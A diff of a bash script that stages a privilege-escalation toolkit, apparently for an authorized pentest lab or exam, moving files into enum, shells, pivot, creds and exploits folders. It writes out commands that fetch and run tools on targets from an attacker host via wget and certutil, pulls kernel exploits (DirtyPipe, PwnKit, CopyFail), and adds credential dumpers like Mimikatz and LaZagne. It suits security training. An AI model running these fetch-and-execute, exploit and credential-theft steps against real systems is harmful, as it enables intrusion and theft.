@@ -68,7 +68,7 @@ while [[ $# -gt 0 ]]; do
     esac
 done
 
-mkdir -p "$TOOLKIT"/{linux/{kernel-exploits/{DirtyPipe,PwnKit,CopyFail},templates},windows,webshells,attacker/{exploits,bloodhound-docker,source,decryptors,wordlists},templates/{linux,web,sql,services}}
+mkdir -p "$TOOLKIT"/{linux/{enum,shells,pivot,exploits},windows/{enum,privesc,creds,ad,shells,pivot},webshells,attacker/{exploits,bloodhound-docker,source,decryptors,wordlists},templates/{linux,web,services}}
 cd "$TOOLKIT"
 
 fail_or_continue() {
@@ -387,18 +387,18 @@ Terminal 3 - notes and commands:
   script -a target-notes.txt
 
 Useful URLs from targets:
-  http://$LHOST:8000/linux/linpeas.sh
-  http://$LHOST:8000/linux/lse.sh
-  http://$LHOST:8000/linux/pspy64
-  http://$LHOST:8000/linux/busybox
-  http://$LHOST:8000/windows/winPEASx64.exe
-  http://$LHOST:8000/windows/PrivescCheck.ps1
-  http://$LHOST:8000/windows/PowerUp.ps1
-  http://$LHOST:8000/windows/Get-SiteListPassword.ps1
-  http://$LHOST:8000/windows/nc64.exe
-  http://$LHOST:8000/windows/Invoke-ConPtyShell.ps1
-  http://$LHOST:8000/windows/PsExec64.exe
-  http://$LHOST:8000/windows/ligolo-agent.exe
+  http://$LHOST:8000/linux/enum/linpeas.sh
+  http://$LHOST:8000/linux/enum/lse.sh
+  http://$LHOST:8000/linux/enum/pspy64
+  http://$LHOST:8000/linux/shells/busybox
+  http://$LHOST:8000/windows/enum/winPEASx64.exe
+  http://$LHOST:8000/windows/enum/PrivescCheck.ps1
+  http://$LHOST:8000/windows/enum/PowerUp.ps1
+  http://$LHOST:8000/windows/creds/Get-SiteListPassword.ps1
+  http://$LHOST:8000/windows/shells/nc64.exe
+  http://$LHOST:8000/windows/shells/Invoke-ConPtyShell.ps1
+  http://$LHOST:8000/windows/shells/PsExec64.exe
+  http://$LHOST:8000/windows/pivot/ligolo-agent.exe
 
 Initial-access attacker-side helpers staged locally:
   $TOOLKIT/attacker/high-port-http-check.sh
@@ -512,7 +512,7 @@ Step 3 - check credentials and backups:
 
 Step 4 - run LinPEAS:
   cd /tmp
-  wget http://$LHOST:8000/linux/linpeas.sh -O linpeas.sh || curl http://$LHOST:8000/linux/linpeas.sh -o linpeas.sh
+  wget http://$LHOST:8000/linux/enum/linpeas.sh -O linpeas.sh || curl http://$LHOST:8000/linux/enum/linpeas.sh -o linpeas.sh
   chmod +x linpeas.sh
   ./linpeas.sh | tee /tmp/linpeas.out
 
@@ -529,17 +529,17 @@ Read LinPEAS output slowly. Do not only look at red lines. Specifically check:
   - kernel version suggestions.
 
 Step 5 - use fallbacks if LinPEAS is too noisy or fails:
-  wget http://$LHOST:8000/linux/lse.sh -O lse.sh && chmod +x lse.sh && ./lse.sh -l 1 | tee /tmp/lse.out
-  wget http://$LHOST:8000/linux/LinEnum.sh -O LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh | tee /tmp/linenum.out
+  wget http://$LHOST:8000/linux/enum/lse.sh -O lse.sh && chmod +x lse.sh && ./lse.sh -l 1 | tee /tmp/lse.out
+  wget http://$LHOST:8000/linux/enum/LinEnum.sh -O LinEnum.sh && chmod +x LinEnum.sh && ./LinEnum.sh | tee /tmp/linenum.out
 
 Step 6 - watch processes if cron, scripts, or backups are suspected:
-  wget http://$LHOST:8000/linux/pspy64 -O pspy64
+  wget http://$LHOST:8000/linux/enum/pspy64 -O pspy64
   chmod +x pspy64
   ./pspy64
 
 Step 7 - only then consider kernel exploits:
-  wget http://$LHOST:8000/linux/les.sh -O les.sh && chmod +x les.sh && ./les.sh
-  wget http://$LHOST:8000/linux/linux-exploit-suggester-2.pl -O les2.pl && perl les2.pl
+  wget http://$LHOST:8000/linux/enum/les.sh -O les.sh && chmod +x les.sh && ./les.sh
+  wget http://$LHOST:8000/linux/enum/linux-exploit-suggester-2.pl -O les2.pl && perl les2.pl
 
 Kernel exploits are last resort. Confirm architecture, distro, kernel, and compile
 requirements first.
@@ -607,13 +607,13 @@ Step 1 - identify context:
 Step 2 - create workspace and transfer tools:
   mkdir C:\Temp 2>nul
   cd C:\Temp
-  certutil -urlcache -f http://$LHOST:8000/windows/winPEASx64.exe winPEASx64.exe
-  certutil -urlcache -f http://$LHOST:8000/windows/PrivescCheck.ps1 PrivescCheck.ps1
-  certutil -urlcache -f http://$LHOST:8000/windows/PowerUp.ps1 PowerUp.ps1
-  certutil -urlcache -f http://$LHOST:8000/windows/nc64.exe nc64.exe
+  certutil -urlcache -f http://$LHOST:8000/windows/enum/winPEASx64.exe winPEASx64.exe
+  certutil -urlcache -f http://$LHOST:8000/windows/enum/PrivescCheck.ps1 PrivescCheck.ps1
+  certutil -urlcache -f http://$LHOST:8000/windows/enum/PowerUp.ps1 PowerUp.ps1
+  certutil -urlcache -f http://$LHOST:8000/windows/shells/nc64.exe nc64.exe
 
 PowerShell download fallback:
-  powershell -ep bypass -c "iwr http://$LHOST:8000/windows/winPEASx64.exe -OutFile C:\Temp\winPEASx64.exe"
+  powershell -ep bypass -c "iwr http://$LHOST:8000/windows/enum/winPEASx64.exe -OutFile C:\Temp\winPEASx64.exe"
 
 Step 3 - run WinPEAS and save output:
   C:\Temp\winPEASx64.exe > C:\Temp\winpeas.txt
@@ -798,7 +798,7 @@ Login:
 Collect from Windows foothold using SharpHound:
   mkdir C:\Temp 2>nul
   cd C:\Temp
-  certutil -urlcache -f http://$LHOST:8000/windows/SharpHound/SharpHound.exe SharpHound.exe
+  certutil -urlcache -f http://$LHOST:8000/windows/ad/SharpHound/SharpHound.exe SharpHound.exe
   SharpHound.exe -c All --zipfilename loot.zip
 
 Then download the ZIP to Kali and upload it through BloodHound CE Quick Upload.
@@ -824,12 +824,12 @@ Attacker setup:
 
 Windows target agent:
   cd C:\Temp
-  certutil -urlcache -f http://$LHOST:8000/windows/ligolo-agent.exe ligolo-agent.exe
+  certutil -urlcache -f http://$LHOST:8000/windows/pivot/ligolo-agent.exe ligolo-agent.exe
   ligolo-agent.exe -connect $LHOST:11601 -ignore-cert
 
 Linux target agent:
   cd /tmp
-  wget http://$LHOST:8000/linux/ligolo-agent -O ligolo-agent || curl http://$LHOST:8000/linux/ligolo-agent -o ligolo-agent
+  wget http://$LHOST:8000/linux/pivot/ligolo-agent -O ligolo-agent || curl http://$LHOST:8000/linux/pivot/ligolo-agent -o ligolo-agent
   chmod +x ligolo-agent
   ./ligolo-agent -connect $LHOST:11601 -ignore-cert
 
@@ -933,7 +933,7 @@ else
     missing=1
 fi
 
-if [[ -f "$HOME/privesc-toolkit/windows/SharpHound/SharpHound.exe" || -f "$HOME/privesc-toolkit/windows/SharpHound.exe" ]]; then
+if [[ -f "$HOME/privesc-toolkit/windows/ad/SharpHound/SharpHound.exe" || -f "$HOME/privesc-toolkit/windows/ad/SharpHound.exe" ]]; then
     printf '[ OK ] SharpHound staged\n'
 else
     printf '[MISS] SharpHound staged\n'
@@ -1239,17 +1239,17 @@ echo "============================================================"
 
 banner "LINUX ENUMERATION"
 echo "[+] LinPEAS..."
-dl linux/linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
-dl linux/linpeas_linux_amd64 https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
-chmodx linux/linpeas.sh linux/linpeas_linux_amd64
+dl linux/enum/linpeas.sh https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas.sh
+dl linux/enum/linpeas_linux_amd64 https://github.com/peass-ng/PEASS-ng/releases/latest/download/linpeas_linux_amd64
+chmodx linux/enum/linpeas.sh linux/enum/linpeas_linux_amd64
 
 echo "[+] Linux Smart Enumeration (lse.sh)..."
-dl linux/lse.sh https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
-chmodx linux/lse.sh
+dl linux/enum/lse.sh https://raw.githubusercontent.com/diego-treitos/linux-smart-enumeration/master/lse.sh
+chmodx linux/enum/lse.sh
 
 echo "[+] LinEnum fallback..."
-dl linux/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
-chmodx linux/LinEnum.sh
+dl linux/enum/LinEnum.sh https://raw.githubusercontent.com/rebootuser/LinEnum/master/LinEnum.sh
+chmodx linux/enum/LinEnum.sh
 
 # unix-privesc-check (pentestmonkey): old and largely superseded by LinPEAS/lse.
 # The upstream master branch is the modular v2 (a driver plus a lib/ tree), which is
@@ -1260,58 +1260,58 @@ echo "[+] unix-privesc-check (legacy cross-check, from Kali package)..."
 if [[ "$DRY_RUN" == "1" ]]; then
     echo "       dry-run: would copy Kali's unix-privesc-check into linux/"
 elif have unix-privesc-check; then
-    cp -f "$(command -v unix-privesc-check)" linux/unix-privesc-check && chmodx linux/unix-privesc-check
+    cp -f "$(command -v unix-privesc-check)" linux/enum/unix-privesc-check && chmodx linux/enum/unix-privesc-check
 else
     warn "unix-privesc-check not installed; get it with: sudo apt install -y unix-privesc-check (optional, low priority)"
 fi
 
 echo "[+] Linux Exploit Suggester..."
-dl linux/les.sh https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
-chmodx linux/les.sh
+dl linux/enum/les.sh https://raw.githubusercontent.com/mzet-/linux-exploit-suggester/master/linux-exploit-suggester.sh
+chmodx linux/enum/les.sh
 
 echo "[+] Linux Exploit Suggester 2..."
-dl linux/linux-exploit-suggester-2.pl https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl
-chmodx linux/linux-exploit-suggester-2.pl
+dl linux/enum/linux-exploit-suggester-2.pl https://raw.githubusercontent.com/jondonas/linux-exploit-suggester-2/master/linux-exploit-suggester-2.pl
+chmodx linux/enum/linux-exploit-suggester-2.pl
 
 banner "LINUX PROCESS MONITORING"
 echo "[+] pspy (64-bit + 32-bit)..."
-dl linux/pspy64 https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
-dl linux/pspy32 https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32
-chmodx linux/pspy64 linux/pspy32
+dl linux/enum/pspy64 https://github.com/DominicBreuker/pspy/releases/latest/download/pspy64
+dl linux/enum/pspy32 https://github.com/DominicBreuker/pspy/releases/latest/download/pspy32
+chmodx linux/enum/pspy64 linux/enum/pspy32
 
 banner "LINUX NETWORKING / SHELLS"
 echo "[+] Static ncat..."
-dl linux/ncat https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat
-chmodx linux/ncat
+dl linux/shells/ncat https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/ncat
+chmodx linux/shells/ncat
 
 echo "[+] Static socat..."
-dl linux/socat https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
-chmodx linux/socat
+dl linux/shells/socat https://github.com/andrew-d/static-binaries/raw/master/binaries/linux/x86_64/socat
+chmodx linux/shells/socat
 
 echo "[+] Static curl..."
-dl linux/curl https://github.com/moparisthebest/static-curl/releases/latest/download/curl-amd64
-chmodx linux/curl
+dl linux/shells/curl https://github.com/moparisthebest/static-curl/releases/latest/download/curl-amd64
+chmodx linux/shells/curl
 
 echo "[+] Static busybox..."
-dl linux/busybox https://busybox.net/downloads/binaries/1.35.0-x86_64-linux-musl/busybox
-chmodx linux/busybox
+dl linux/shells/busybox https://busybox.net/downloads/binaries/1.35.0-x86_64-linux-musl/busybox
+chmodx linux/shells/busybox
 
 echo "[+] Static bash fallback..."
-dl linux/bash-static https://github.com/robxu9/bash-static/releases/download/5.2.015-1.2.3-2/bash-linux-x86_64
-chmodx linux/bash-static
+dl linux/shells/bash-static https://github.com/robxu9/bash-static/releases/download/5.2.015-1.2.3-2/bash-linux-x86_64
+chmodx linux/shells/bash-static
 
 banner "LINUX KERNEL EXPLOITS"
 echo "[+] DirtyPipe exploit sources..."
-dl linux/kernel-exploits/DirtyPipe/exploit.c https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c
-dl linux/kernel-exploits/DirtyPipe/exploit-1.c https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.c
-dl linux/kernel-exploits/DirtyPipe/exploit-2.c https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-2.c
+dl linux/exploits/dirtypipe-exploit.c https://raw.githubusercontent.com/Arinerron/CVE-2022-0847-DirtyPipe-Exploit/main/exploit.c
+dl linux/exploits/dirtypipe-exploit-1.c https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-1.c
+dl linux/exploits/dirtypipe-exploit-2.c https://raw.githubusercontent.com/AlexisAhmed/CVE-2022-0847-DirtyPipe-Exploits/main/exploit-2.c
 
 echo "[+] PwnKit self-contained binary..."
-dl linux/kernel-exploits/PwnKit/PwnKit https://github.com/ly4k/PwnKit/raw/main/PwnKit
-chmodx linux/kernel-exploits/PwnKit/PwnKit
+dl linux/exploits/pwnkit https://github.com/ly4k/PwnKit/raw/main/PwnKit
+chmodx linux/exploits/pwnkit
 
 echo "[+] Copy Fail prereq checker, verified PoC fetcher, and README..."
-cat > linux/kernel-exploits/CopyFail/check-copyfail-prereqs.sh <<'EOF'
+cat > linux/exploits/check-copyfail-prereqs.sh <<'EOF'
 #!/usr/bin/env bash
 set -u
 ok=1
@@ -1382,9 +1382,9 @@ else
 fi
 exit "$ok"
 EOF
-chmod +x linux/kernel-exploits/CopyFail/check-copyfail-prereqs.sh
+chmod +x linux/exploits/check-copyfail-prereqs.sh
 
-cat > linux/kernel-exploits/CopyFail/fetch-copyfail-poc.sh <<'EOF'
+cat > linux/exploits/fetch-copyfail-poc.sh <<'EOF'
 #!/usr/bin/env bash
 set -Eeuo pipefail
 OUT="${1:-copy_fail_exp.py}"
@@ -1404,15 +1404,15 @@ mv "$TMP" "$OUT"
 chmod +x "$OUT"
 echo "[+] Saved verified CopyFail PoC to $OUT"
 EOF
-chmod +x linux/kernel-exploits/CopyFail/fetch-copyfail-poc.sh
+chmod +x linux/exploits/fetch-copyfail-poc.sh
 
 if [[ "$DRY_RUN" != "1" ]]; then
-    (cd linux/kernel-exploits/CopyFail && ./fetch-copyfail-poc.sh copy_fail_exp.py) || warn "CopyFail PoC fetch/hash verification failed; fetch manually with fetch-copyfail-poc.sh"
+    (cd linux/exploits && ./fetch-copyfail-poc.sh copy_fail_exp.py) || warn "CopyFail PoC fetch/hash verification failed; fetch manually with fetch-copyfail-poc.sh"
 else
     echo "       dry-run: would fetch and hash-check CopyFail PoC"
 fi
 
-cat > linux/kernel-exploits/CopyFail/README-COPYFAIL.txt <<'EOF'
+cat > linux/exploits/README-COPYFAIL.txt <<'EOF'
 COPY FAIL / CVE-2026-31431
 
 Use this only after normal Linux privilege-escalation paths fail and only on authorized lab/exam targets.
@@ -1432,14 +1432,14 @@ When to try:
   - /usr/bin/su or another readable SUID-root binary exists.
 
 Kali staging check:
-  cd ~/privesc-toolkit/linux/kernel-exploits/CopyFail
+  cd ~/privesc-toolkit/linux/exploits
   ./fetch-copyfail-poc.sh copy_fail_exp.py
   sha256sum copy_fail_exp.py
 
 Target flow:
   cd /tmp
-  wget http://<KALI_IP>:8000/linux/kernel-exploits/CopyFail/check-copyfail-prereqs.sh -O check-copyfail-prereqs.sh
-  wget http://<KALI_IP>:8000/linux/kernel-exploits/CopyFail/copy_fail_exp.py -O copy_fail_exp.py
+  wget http://<KALI_IP>:8000/linux/exploits/check-copyfail-prereqs.sh -O check-copyfail-prereqs.sh
+  wget http://<KALI_IP>:8000/linux/exploits/copy_fail_exp.py -O copy_fail_exp.py
   chmod +x check-copyfail-prereqs.sh copy_fail_exp.py
   ./check-copyfail-prereqs.sh
   python3 copy_fail_exp.py
@@ -1455,22 +1455,22 @@ EOF
 
 if have gcc && [[ "$DRY_RUN" != "1" ]]; then
     echo "[+] Pre-compiling DirtyPipe exploits where possible..."
-    gcc linux/kernel-exploits/DirtyPipe/exploit.c -o linux/kernel-exploits/DirtyPipe/dirtypipe-arinerron 2>/dev/null || warn "DirtyPipe Arinerron compile failed"
-    gcc linux/kernel-exploits/DirtyPipe/exploit-1.c -o linux/kernel-exploits/DirtyPipe/dirtypipe-alexis1 2>/dev/null || warn "DirtyPipe Alexis exploit-1 compile failed"
-    gcc linux/kernel-exploits/DirtyPipe/exploit-2.c -o linux/kernel-exploits/DirtyPipe/dirtypipe-alexis2 2>/dev/null || warn "DirtyPipe Alexis exploit-2 compile failed"
+    gcc linux/exploits/dirtypipe-exploit.c -o linux/exploits/dirtypipe-arinerron 2>/dev/null || warn "DirtyPipe Arinerron compile failed"
+    gcc linux/exploits/dirtypipe-exploit-1.c -o linux/exploits/dirtypipe-alexis1 2>/dev/null || warn "DirtyPipe Alexis exploit-1 compile failed"
+    gcc linux/exploits/dirtypipe-exploit-2.c -o linux/exploits/dirtypipe-alexis2 2>/dev/null || warn "DirtyPipe Alexis exploit-2 compile failed"
 fi
 
 banner "LINUX PIVOTING"
 echo "[+] Chisel Linux amd64..."
-dl_gz linux/chisel "https://github.com/jpillora/chisel/releases/download/v${CHISEL_VER}/chisel_${CHISEL_VER}_linux_amd64.gz"
-chmodx linux/chisel
+dl_gz linux/pivot/chisel "https://github.com/jpillora/chisel/releases/download/v${CHISEL_VER}/chisel_${CHISEL_VER}_linux_amd64.gz"
+chmodx linux/pivot/chisel
 
 echo "[+] Ligolo-ng agent Linux amd64..."
-dl_targz_dir linux "https://github.com/nicocha30/ligolo-ng/releases/download/v${LIGOLO_VER}/ligolo-ng_agent_${LIGOLO_VER}_linux_amd64.tar.gz"
-for f in linux/ligolo-ng_agent linux/ligolo-ng_agent_*_linux_amd64 linux/agent; do
-    [[ -f "$f" ]] && mv -f "$f" linux/ligolo-agent 2>/dev/null && break
+dl_targz_dir linux/pivot "https://github.com/nicocha30/ligolo-ng/releases/download/v${LIGOLO_VER}/ligolo-ng_agent_${LIGOLO_VER}_linux_amd64.tar.gz"
+for f in linux/pivot/ligolo-ng_agent linux/pivot/ligolo-ng_agent_*_linux_amd64 linux/pivot/agent; do
+    [[ -f "$f" ]] && mv -f "$f" linux/pivot/ligolo-agent 2>/dev/null && break
 done
-chmodx linux/ligolo-agent
+chmodx linux/pivot/ligolo-agent
 
 # ╔══════════════════════════════════════════════════════════════════════════════╗
 # ║  WINDOWS — transfer these to Windows targets                               ║
@@ -1479,62 +1479,62 @@ chmodx linux/ligolo-agent
 banner "WINDOWS ENUMERATION"
 BASE="https://github.com/peass-ng/PEASS-ng/releases/latest/download"
 echo "[+] WinPEAS family..."
-dl windows/winPEASx64.exe "$BASE/winPEASx64.exe"
-dl windows/winPEASx86.exe "$BASE/winPEASx86.exe"
-dl windows/winPEASany.exe "$BASE/winPEASany.exe"
-dl windows/winPEAS.bat "$BASE/winPEAS.bat"
-dl windows/winPEAS.ps1 https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1
-dl windows/winPEASx64_ofs.exe "$BASE/winPEASx64_ofs.exe"
-dl windows/winPEASx86_ofs.exe "$BASE/winPEASx86_ofs.exe"
+dl windows/enum/winPEASx64.exe "$BASE/winPEASx64.exe"
+dl windows/enum/winPEASx86.exe "$BASE/winPEASx86.exe"
+dl windows/enum/winPEASany.exe "$BASE/winPEASany.exe"
+dl windows/enum/winPEAS.bat "$BASE/winPEAS.bat"
+dl windows/enum/winPEAS.ps1 https://raw.githubusercontent.com/carlospolop/PEASS-ng/master/winPEAS/winPEASps1/winPEAS.ps1
+dl windows/enum/winPEASx64_ofs.exe "$BASE/winPEASx64_ofs.exe"
+dl windows/enum/winPEASx86_ofs.exe "$BASE/winPEASx86_ofs.exe"
 
 echo "[+] PowerUp.ps1..."
-dl windows/PowerUp.ps1 https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
+dl windows/enum/PowerUp.ps1 https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Privesc/PowerUp.ps1
 
 echo "[+] PrivescCheck.ps1..."
-dl windows/PrivescCheck.ps1 https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1
+dl windows/enum/PrivescCheck.ps1 https://github.com/itm4n/PrivescCheck/releases/latest/download/PrivescCheck.ps1
 
 echo "[+] Seatbelt.exe..."
-dl windows/Seatbelt.exe https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe
+dl windows/enum/Seatbelt.exe https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Seatbelt.exe
 
 echo "[+] SharpUp.exe..."
-dl windows/SharpUp.exe https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpUp.exe
+dl windows/enum/SharpUp.exe https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/SharpUp.exe
 
 # SharpCollection (Flangvik): nightly-built .NET offensive binaries across multiple
 # runtimes. Superset of the individual Ghostpack .exe files above (Rubeus, Certify,
 # Seatbelt, SharpUp, etc.); useful when you need a specific .NET version build or a
-# tool not staged individually. Large clone, so it lives under windows/SharpCollection.
+# tool not staged individually. Large clone, so it lives under windows/ad/SharpCollection.
 echo "[+] SharpCollection (.NET binaries, superset of Ghostpack)..."
-git_clone https://github.com/Flangvik/SharpCollection.git windows/SharpCollection
+git_clone https://github.com/Flangvik/SharpCollection.git windows/ad/SharpCollection
 
 echo "[+] accesschk64.exe (official signed Sysinternals zip)..."
 # live.sysinternals.com occasionally serves an EULA/redirect instead of the PE;
 # the download.sysinternals.com zip is the canonical, signed source.
-dl_zip_match windows/accesschk64.exe https://download.sysinternals.com/files/AccessChk.zip '(^|/)accesschk64\.exe$'
+dl_zip_match windows/enum/accesschk64.exe https://download.sysinternals.com/files/AccessChk.zip '(^|/)accesschk64\.exe$'
 
 banner "WINDOWS PRIVILEGE ESCALATION"
 echo "[+] GodPotato..."
-dl windows/GodPotato-NET4.exe https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe
-dl windows/GodPotato-NET35.exe https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET35.exe
+dl windows/privesc/GodPotato-NET4.exe https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET4.exe
+dl windows/privesc/GodPotato-NET35.exe https://github.com/BeichenDream/GodPotato/releases/latest/download/GodPotato-NET35.exe
 
 echo "[+] PrintSpoofer..."
-dl windows/PrintSpoofer64.exe https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
-dl windows/PrintSpoofer32.exe https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe
+dl windows/privesc/PrintSpoofer64.exe https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer64.exe
+dl windows/privesc/PrintSpoofer32.exe https://github.com/itm4n/PrintSpoofer/releases/download/v1.0/PrintSpoofer32.exe
 
 echo "[+] JuicyPotato..."
-dl windows/JuicyPotato.exe https://github.com/ohpe/juicy-potato/releases/latest/download/JuicyPotato.exe
+dl windows/privesc/JuicyPotato.exe https://github.com/ohpe/juicy-potato/releases/latest/download/JuicyPotato.exe
 
 echo "[+] SigmaPotato..."
-dl windows/SigmaPotato.exe https://github.com/tylerdotrar/SigmaPotato/releases/latest/download/SigmaPotato.exe
+dl windows/privesc/SigmaPotato.exe https://github.com/tylerdotrar/SigmaPotato/releases/latest/download/SigmaPotato.exe
 
 echo "[+] FullPowers..."
-dl windows/FullPowers.exe https://github.com/itm4n/FullPowers/releases/download/v0.1/FullPowers.exe
+dl windows/privesc/FullPowers.exe https://github.com/itm4n/FullPowers/releases/download/v0.1/FullPowers.exe
 
 echo "[+] JuicyPotatoNG fallback..."
-dl_zip_match windows/JuicyPotatoNG.exe https://github.com/antonioCoco/JuicyPotatoNG/releases/latest/download/JuicyPotatoNG.zip '(^|/)JuicyPotatoNG\.exe$'
+dl_zip_match windows/privesc/JuicyPotatoNG.exe https://github.com/antonioCoco/JuicyPotatoNG/releases/latest/download/JuicyPotatoNG.zip '(^|/)JuicyPotatoNG\.exe$'
 
 echo "[+] RoguePotato fallback..."
-dl_zip_match windows/RoguePotato.exe https://github.com/antonioCoco/RoguePotato/releases/latest/download/RoguePotato.zip '(^|/)RoguePotato\.exe$'
-dl_zip_match windows/RogueOxidResolver.exe https://github.com/antonioCoco/RoguePotato/releases/latest/download/RoguePotato.zip '(^|/)RogueOxidResolver\.exe$'
+dl_zip_match windows/privesc/RoguePotato.exe https://github.com/antonioCoco/RoguePotato/releases/latest/download/RoguePotato.zip '(^|/)RoguePotato\.exe$'
+dl_zip_match windows/privesc/RogueOxidResolver.exe https://github.com/antonioCoco/RoguePotato/releases/latest/download/RoguePotato.zip '(^|/)RogueOxidResolver\.exe$'
 
 echo "[+] SharpEfsPotato fallback..."
 # The upstream project does not publish release binaries. Keep the official source locally
@@ -1544,12 +1544,12 @@ if [[ -d attacker/source/SharpEfsPotato ]]; then
     if have msbuild && [[ "$DRY_RUN" != "1" ]]; then
         (cd attacker/source/SharpEfsPotato && msbuild SharpEfsPotato.sln /p:Configuration=Release >/dev/null 2>&1) || warn "SharpEfsPotato compile failed; source was still cloned"
         SHARPEFS_EXE="$(find attacker/source/SharpEfsPotato -type f -iname 'SharpEfsPotato.exe' | head -n 1 || true)"
-        [[ -n "$SHARPEFS_EXE" ]] && cp -f "$SHARPEFS_EXE" windows/SharpEfsPotato.exe
+        [[ -n "$SHARPEFS_EXE" ]] && cp -f "$SHARPEFS_EXE" windows/privesc/SharpEfsPotato.exe
     else
         warn "SharpEfsPotato has no official release binary; source cloned to attacker/source/SharpEfsPotato"
     fi
 fi
-cat > windows/README-SharpEfsPotato.txt <<'EOF'
+cat > windows/privesc/README-SharpEfsPotato.txt <<'EOF'
 SharpEfsPotato upstream does not publish an official release .exe.
 The setup script clones the official source into attacker/source/SharpEfsPotato.
 Prepare a compiled SharpEfsPotato.exe before the exam if you want this fallback ready.
@@ -1560,50 +1560,50 @@ banner "WINDOWS CREDENTIAL DUMPING"
 echo "[+] Mimikatz ebalo55 Win11-compatible fork..."
 git_clone https://github.com/ebalo55/mimikatz.git /tmp/mimikatz-ebalo55
 if [[ -d /tmp/mimikatz-ebalo55/x64 ]]; then
-    mkdir -p windows/mimikatz-ebalo55
-    cp -r /tmp/mimikatz-ebalo55/x64/* windows/mimikatz-ebalo55/ || true
+    mkdir -p windows/creds/mimikatz-ebalo55
+    cp -r /tmp/mimikatz-ebalo55/x64/* windows/creds/mimikatz-ebalo55/ || true
 else
     warn "Could not find ebalo55 x64 binaries; check repo manually"
 fi
 rm -rf /tmp/mimikatz-ebalo55
 
 echo "[+] Mimikatz original latest fallback..."
-dl_zip_dir windows/mimikatz-original https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip
+dl_zip_dir windows/creds/mimikatz-original https://github.com/gentilkiwi/mimikatz/releases/latest/download/mimikatz_trunk.zip
 
 echo "[+] Mimikatz pinned stable fallback..."
-dl_zip_dir windows/mimikatz-stable-2.2.0-20220919 https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
+dl_zip_dir windows/creds/mimikatz-stable https://github.com/gentilkiwi/mimikatz/releases/download/2.2.0-20220919/mimikatz_trunk.zip
 
 echo "[+] LaZagne..."
-dl windows/LaZagne.exe https://github.com/AlessandroZ/LaZagne/releases/latest/download/LaZagne.exe
+dl windows/creds/LaZagne.exe https://github.com/AlessandroZ/LaZagne/releases/latest/download/LaZagne.exe
 
 echo "[+] RunasCs..."
-dl_zip_dir windows/RunasCs https://github.com/antonioCoco/RunasCs/releases/latest/download/RunasCs.zip
+dl_zip_dir windows/creds/RunasCs https://github.com/antonioCoco/RunasCs/releases/latest/download/RunasCs.zip
 
 banner "WINDOWS ACTIVE DIRECTORY"
 echo "[+] Rubeus..."
-dl windows/Rubeus.exe https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
+dl windows/ad/Rubeus.exe https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Rubeus.exe
 
 echo "[+] Certify..."
-dl windows/Certify.exe https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Certify.exe
+dl windows/ad/Certify.exe https://github.com/r3motecontrol/Ghostpack-CompiledBinaries/raw/master/Certify.exe
 
 echo "[+] SharpHound latest zip..."
 SHARPHOUND_URL="$(github_latest_asset SpecterOps/SharpHound '\.zip$' || true)"
 if [[ -n "$SHARPHOUND_URL" ]]; then
-    dl_zip_dir windows/SharpHound "$SHARPHOUND_URL"
+    dl_zip_dir windows/ad/SharpHound "$SHARPHOUND_URL"
 else
     fail_or_continue "SharpHound latest zip"
 fi
 
 echo "[+] PowerView..."
-dl windows/PowerView.ps1 https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
+dl windows/ad/PowerView.ps1 https://raw.githubusercontent.com/PowerShellMafia/PowerSploit/master/Recon/PowerView.ps1
 
 echo "[+] PowerUpSQL..."
-dl windows/PowerUpSQL.ps1 https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1
+dl windows/ad/PowerUpSQL.ps1 https://raw.githubusercontent.com/NetSPI/PowerUpSQL/master/PowerUpSQL.ps1
 
 
 echo "[+] McAfee SiteList decryptors..."
 git_clone https://github.com/funoverip/mcafee-sitelist-pwd-decryption.git attacker/decryptors/mcafee-sitelist-pwd-decryption
-dl windows/Get-SiteListPassword.ps1 https://raw.githubusercontent.com/EmpireProject/Empire/master/data/module_source/privesc/Get-SiteListPassword.ps1
